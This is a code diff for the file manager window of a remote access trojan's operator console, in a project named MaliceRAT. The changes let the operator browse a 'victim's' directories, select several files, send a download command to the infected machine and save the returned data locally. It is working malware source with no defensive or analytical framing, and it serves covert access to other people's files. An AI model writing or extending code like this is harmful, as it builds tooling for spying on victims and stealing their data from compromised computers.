@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Web.Script.Serialization;
 using System.IO;
 using MaliceRAT.RatServer;
+using System.Linq;
 
 namespace MaliceRAT.RatUI
 {
@@ -25,8 +26,7 @@ namespace MaliceRAT.RatUI
 
             server.fileManager.FilesAndFoldersReceived += OnFilesAndFoldersReceived;
             server.fileManager.FileUploaded += OnFileUploaded;
-
-            titleLabel.Text = $"File Manager [{server.GetVictimById(victimId).User}]";
+            server.fileManager.FileDownloaded += OnFileDownloaded;
         }
         #endregion
 
@@ -42,6 +42,15 @@ namespace MaliceRAT.RatUI
             JavaScriptSerializer serializer = new JavaScriptSerializer();
             Dictionary<string, Dictionary<string, string>> filesAndFolders = serializer.Deserialize<Dictionary<string, Dictionary<string, string>>>(filesAndFoldersJson);
             gunaFilesTable.Rows.Clear();
+
+            // Add ".." entry for parent directory if not at root
+            if (!string.IsNullOrEmpty(gunadirPath.Text) && gunadirPath.Text != Path.GetPathRoot(gunadirPath.Text))
+            {
+                var parentRow = new DataGridViewRow();
+                parentRow.CreateCells(gunaFilesTable, "..", "DIRECTORY", "");
+                gunaFilesTable.Rows.Add(parentRow);
+            }
+
             foreach (var entry in filesAndFolders)
             {
                 var row = new DataGridViewRow();
@@ -51,7 +60,7 @@ namespace MaliceRAT.RatUI
         }
 
         private void FileManagerForm_Load(object sender, EventArgs e)
-        {   
+        {
             ReadDirectory(gunadirPath.Text);
         }
 
@@ -98,7 +107,20 @@ namespace MaliceRAT.RatUI
 
         private void Download_Click(object sender, EventArgs e)
         {
-            server.GetVictimById(victimId).Send(new { type = "fm_download", path = GetPath() });
+            var selectedRows = gunaFilesTable.SelectedRows.Cast<DataGridViewRow>().ToList();
+            if (selectedRows.Count == 0)
+            {
+                selectedRows = gunaFilesTable.SelectedCells.Cast<DataGridViewCell>()
+                    .Select(cell => cell.OwningRow)
+                    .Distinct()
+                    .ToList();
+            }
+
+            List<string> paths = selectedRows
+                .Select(row => Path.Combine(gunadirPath.Text, row.Cells[0].Value.ToString()))
+                .ToList();
+
+            server.GetVictimById(victimId).Send(new { type = "fm_download", paths });
         }
 
         private void Delete_Click(object sender, EventArgs e)
@@ -140,6 +162,47 @@ namespace MaliceRAT.RatUI
                 }
             });
         }
+
+        private void OnFileDownloaded(Victim victim, string name, byte[] data)
+        {
+            this.Invoke((MethodInvoker)delegate
+            {
+                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
+                {
+                    saveFileDialog.FileName = name;
+                    saveFileDialog.Filter = "Zip files (*.zip)|*.zip|All files (*.*)|*.*";
+
+                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                    {
+                        File.WriteAllBytes(saveFileDialog.FileName, data);
+                    }
+                }
+            });
+        }
         #endregion
+
+        private void gunaFilesTable_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
+        {
+            if (e.RowIndex >= 0)
+            {
+                string fileName = gunaFilesTable.Rows[e.RowIndex].Cells[0].Value.ToString();
+                string fileType = gunaFilesTable.Rows[e.RowIndex].Cells[1].Value.ToString();
+
+                if (fileType == "DIRECTORY")
+                {
+                    string newPath;
+                    if (fileName == "..")
+                    {
+                        newPath = Path.GetDirectoryName(gunadirPath.Text);
+                    }
+                    else
+                    {
+                        newPath = Path.Combine(gunadirPath.Text, fileName);
+                    }
+                    gunadirPath.Text = newPath;
+                    ReadDirectory(newPath);
+                }
+            }
+        }
     }
 }
